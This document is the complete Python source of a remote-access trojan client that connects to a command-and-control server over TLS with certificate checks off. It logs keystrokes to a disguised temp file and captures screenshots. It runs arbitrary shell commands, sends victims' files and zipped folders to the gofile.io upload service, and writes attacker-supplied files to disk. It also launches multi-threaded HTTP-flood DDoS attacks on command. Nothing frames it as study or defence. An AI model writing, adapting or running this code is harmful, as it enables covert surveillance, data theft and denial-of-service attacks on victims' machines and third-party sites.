import subprocess
import time
import os
canKeyLogger = True
try:
    from pynput import keyboard
except:
    canKeyLogger = False
import threading
import socket
import subprocess
import zipfile
import io
import re
from mss import mss
import requests
import tkinter as tk
from tkinter import messagebox
import tempfile
import locale
from PIL import Image
import platform
from pathlib import Path
import struct
import ssl

HOST = "localhost" # replace with the c2 IP address
PORT = 443

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def get_clean_discord_channel_name():
    pc_name = socket.gethostname().lower()

    if platform.system() == "Windows":
        cmd = "(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid"
        result = subprocess.run(["powershell", "-Command", cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        pc_name += "-" + result.stdout.strip()
    elif platform.system() == "Linux":
        result = subprocess.run(["cat", "/etc/machine-id"], stdout=subprocess.PIPE, text=True)
        pc_name += "-" + result.stdout.strip()

    pc_name = pc_name.replace(" ", "-")

    pc_name = re.sub(r"[^a-z0-9-]", "", pc_name)

    pc_name = re.sub(r"-{2,}", "-", pc_name)

    pc_name = pc_name.strip("-")

    if not pc_name:
        pc_name = "channel"

    return pc_name

pc_name = get_clean_discord_channel_name()

sendMessageLock = threading.Lock()

tempFolder = Path(tempfile.gettempdir())

key_logger_file = tempFolder / 'Y291Y291IGplIG0nYXBwZWxsZSBmcmFuw6dvaXM='

with open(key_logger_file, "a", encoding="utf-8") as f:
    f.write("\n----------------------------- started -----------------------------\n")

nb_attacks = 0

def compresser_dossier_vers_zip(dossier_source, fichier_zip):
    with zipfile.ZipFile(fichier_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for dossier_racine, dossiers, fichiers in os.walk(dossier_source):
            for fichier in fichiers:
                chemin_absolu = os.path.join(dossier_racine, fichier)
                chemin_relatif = os.path.relpath(chemin_absolu, dossier_source)
                zipf.write(chemin_absolu, chemin_relatif)

def wait_for_connexion():
    while True:
        try:
            with socket.create_connection(('www.google.com', 80), timeout=5):
                break
        except:
            time.sleep(5)

def set_volume(volume: int):
    import platform, subprocess
    
    system = platform.system()

    if system == "Windows":
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        CoInitialize()
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_interface = cast(interface, POINTER(IAudioEndpointVolume))

            if volume_interface.GetMute():
                volume_interface.SetMute(0, None)

            volume_interface.SetMasterVolumeLevelScalar(volume / 100.0, None)
        finally:
            CoUninitialize()

    elif system == "Darwin":
        subprocess.run(["osascript", "-e", "set volume without output muted"])
        subprocess.run(["osascript", "-e", f"set volume output volume {volume}"])
    elif system == "Linux":
        subprocess.run(["amixer", "sset", "Master", "unmute"])
        subprocess.run(["amixer", "sset", "Master", f"{volume}%"])
    else:
        raise NotImplementedError(f"OS {system} non supporté.")

def start_key_logger():
    if canKeyLogger:
        def on_press(key):
            try:
                with open(key_logger_file, "a", encoding="utf-8") as f:
                    f.write(key.char)
            except AttributeError:
                with open(key_logger_file, "a", encoding="utf-8") as f:
                    if key == keyboard.Key.enter:
                        f.write("\n")
                    elif key == keyboard.Key.space:
                        f.write(" ")
                    elif key == keyboard.Key.backspace:
                        f.write("[SUPPR]")
                    elif key == keyboard.Key.tab:
                        f.write("[TAB]")
                    elif key == keyboard.Key.esc:
                        f.write("[ESC]")
                    else:
                        f.write(f"[{key.name.upper()}]")
            except Exception as e:
                pass

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

def send_message(sock: socket.socket, data: bytes):
    with sendMessageLock:
        header = struct.pack(">I", len(data))
        sock.sendall(header + data)

def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = bytearray()
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("Connection")
        buf.extend(chunk)
    return bytes(buf)

def getscreenpic(conn: socket.socket):
    try:
        with mss() as sct:
            screenshot = sct.grab(sct.monitors[1])
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            buf = io.BytesIO()
            img.save(buf, format="JPEG")
            data = buf.getvalue()
            send_message(conn, data)
    except Exception as e:
        send_message(conn, f"An error occured : {e}".encode())

def spam_url_ip(ip_url: str, port: int, temps: int):
    global nb_attacks

    if port == 443:
        if not ip_url.startswith("https://"):
            ip_url = "https://" + ip_url.lstrip("http://")
    else:
        if not ip_url.startswith("http://"):
            ip_url = "http://" + ip_url.lstrip("https://")

    if port not in (80, 443):
        url_with_port = f"{ip_url}:{port}"
    else:
        url_with_port = ip_url

    start_time = time.time()
    while time.time() - start_time < temps:
        try:
            requests.get(url_with_port, timeout=1)
            nb_attacks += 1
        except:
            pass

def ddos(conn: socket.socket, ip: str = ""):
    try:
        global nb_attacks
        aaa = ip.split("::")
        if len(aaa) == 3:
            ip = aaa[0]
            port = int(aaa[1])
            temps = int(aaa[2])
        else:
            send_message(conn, b"Incorrect format. Usage: !ddos <IP>::<PORT>::<TIME")
            return
        try:
            if ip:
                send_message(conn, f"DDOS attack started for {pc_name} on {ip}:{port} during {temps} seconds.".encode())
                nb_attacks = 0
                for _ in range(50):
                    threading.Thread(target=spam_url_ip, args=(ip, port, temps)).start()
                time.sleep(temps + 5)
                send_message(conn, f"The DDOS attack is over for **{pc_name.upper()}**, Number of successful requests : {nb_attacks}.".encode())
            else:
                send_message(conn, b"Please specify a valid IP address.")
        except Exception as e:
            send_message(conn, f"An error occured : {e}".encode())
    except Exception as e:
        send_message(conn, f"An error occured : {e}".encode())

def shell(conn: socket.socket, command: str):
    if command.startswith("cd"):
        try:
            os.chdir(command[3:])
            send_message(conn, os.getcwd().encode())
        except Exception as e:
            send_message(conn, f"Error: {e}".encode())
    else:
        enc = locale.getpreferredencoding(False)
        output = subprocess.run(
            command, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=True
        ).stdout.decode(enc, errors="replace")

        if output:
            send_message(conn, ("Command executed successfully :\n" + output).encode())
        else:
            send_message(conn, b"Either the command was not recognized or it was executed successfully?")

def show_message(title: str, message: str, icon: str):
    try:
        icon_map = {
            "info": "info",
            "warning": "warning",
            "error": "error",
            "question": "question"
        }
        chosen_icon = icon_map.get(icon.lower(), "info")
        
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        root.lift()
        
        if chosen_icon == "info":
            messagebox.showinfo(title, message, parent=root)
        elif chosen_icon == "warning":
            messagebox.showwarning(title, message, parent=root)
        elif chosen_icon == "error":
            messagebox.showerror(title, message, parent=root)
        elif chosen_icon == "question":
            messagebox.askquestion(title, message, parent=root)
        
        root.destroy()
    except:
        pass

def message(conn: socket.socket, content: str):
    try:
        parts = content.split("::")
        if len(parts) != 3:
            send_message(conn, b"Incorrect format. Usage : !message <Title>::<Message>::<Icon>")
            return
        title, msg, icon = parts
        threading.Thread(target=show_message, args=(title, msg, icon)).start()
        send_message(conn, b"Message sent !")
    except Exception as e:
        send_message(conn, f"An error occured : {e}".encode())

def keylogger(conn: socket.socket):
    try:
        with open(key_logger_file, "rb") as f:
            send_message(conn, f.read())
    except Exception as e:
            send_message(conn, f"An error occured {e}".encode())

def download(conn: socket.socket, file_path: str = None):
    try:
        if file_path:
            if os.path.exists(file_path):
                if os.path.isdir(file_path):
                    try:
                        send_message(conn, b"Converting the folder to a zip file...")
                        zip_location = os.path.join(tempFolder, file_path.split("\\")[-1] + ".zip")
                        send_message(conn, zip_location.encode())
                        compresser_dossier_vers_zip(file_path, zip_location)
                        send_message(conn, f"Zip size : {round(os.stat(zip_location).st_size / (1024 * 1024), 2)} Mo ?".encode())
                        send_message(conn, b"Downloading... This will take some time")
                        with open(zip_location, "rb") as f:
                            response = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}).json()
                        if response["status"] == "ok":
                            download_link = response["data"]["downloadPage"]
                            send_message(conn, f"Download link : {download_link}".encode())
                        else:
                            send_message(conn, b"Error during upload.")
                    except Exception as e:
                        send_message(conn, f"An error occured : {e}".encode())
                    finally:
                        os.remove(zip_location)
                else:
                    send_message(conn, b"Downloading...")
                    with open(file_path, "rb") as f:
                        response = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}).json()
                    
                    if response["status"] == "ok":
                        download_link = response["data"]["downloadPage"]
                        send_message(conn, f"Download link : {download_link}".encode())
                    else:
                        send_message(conn, b"Error during uploadd.")
            else:
                send_message(conn, b"The file path is invalid.")
        else:
            send_message(conn, b"Please enter a valid path!")
    except Exception as e:
        send_message(conn, f"An error occured : {e}".encode())

def on_ready():
    global canKeyLogger
    threading.Thread(target=start_key_logger, daemon=True).start()
    canKeyLogger = True

def volume(conn: socket.socket, volume):
    try:
        volume = int(volume)
        try:
            set_volume(volume)
            send_message(conn, f"The volume has been changed to {volume} %".encode())
        except Exception as e:
            send_message(conn, f"An error occurred while changing the volume : {e}".encode())
    except ValueError:
        send_message(conn, b"Invalid volume value")

def upload(conn: socket.socket, data: bytes):
    try:
        parts = data.split(b"::", 2)
        if len(parts) < 3:
            send_message(conn, b"Invalid format. Expected format: path::filename::binaire")
            return

        raw_path = parts[0].decode(errors="ignore")
        raw_filename = parts[1].decode(errors="ignore")
        filecontent = parts[2]

        path = raw_path.strip().strip('"').strip("'")
        filename = raw_filename.strip().strip('"').strip("'")

        path = os.path.normpath(path)

        drive, tail = os.path.splitdrive(path)
        if drive and (tail == "" or tail == os.sep):
            path = drive + os.sep

        file_path = os.path.join(path, filename)

        dir_name = os.path.dirname(file_path)
        if dir_name:
            os.makedirs(dir_name, exist_ok=True)

        with open(file_path, "wb") as f:
            f.write(filecontent)

        send_message(conn, b"File saved successfully.")
    except Exception as e:
        send_message(conn, f"An error occured : {e}".encode())

def handle_command(ssock: socket.socket, res: str):
    if res == "ping":
        send_message(ssock, b"@everyone")
    elif res == "getscreenpic":
        threading.Thread(target=getscreenpic, args=(ssock,), daemon=True).start()
    elif res == "keylogger":
        threading.Thread(target=keylogger, args=(ssock,), daemon=True).start()
    elif res.startswith("shell"):
        threading.Thread(target=shell, args=(ssock, res[6:],), daemon=True).start()
    elif res.startswith("volume"):
        threading.Thread(target=volume, args=(ssock, res[7:],), daemon=True).start()
    elif res.startswith("message"):
        threading.Thread(target=message, args=(ssock, res[8:],), daemon=True).start()
    elif res.startswith("ddos"):
        threading.Thread(target=ddos, args=(ssock, res[5:],), daemon=True).start()
    elif res.startswith("download"):
        threading.Thread(target=download, args=(ssock, res[9:],), daemon=True).start()
    else:
        send_message(ssock, f"[!] Unrecognized command : {res}".encode())

def main():
    on_ready()
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((HOST, PORT))
            sock.settimeout(None)

            with context.wrap_socket(sock, server_hostname=HOST) as ssock:

                send_message(ssock, pc_name.encode())

                while True:
                    header = ssock.recv(4)
                    if not header:
                        break

                    msg_len = struct.unpack(">I", header)[0]
                    raw_data = recv_exact(ssock, msg_len)

                    if not raw_data:
                        continue

                    if raw_data.startswith(b"upload"):
                        upload(ssock, raw_data[len(b"upload"):])
                        continue

                    res = raw_data.decode(errors="ignore")

                    handle_command(ssock, res)
        except Exception as e:
            print(e)
            time.sleep(5)
            wait_for_connexion()

if __name__ == "__main__":
    main()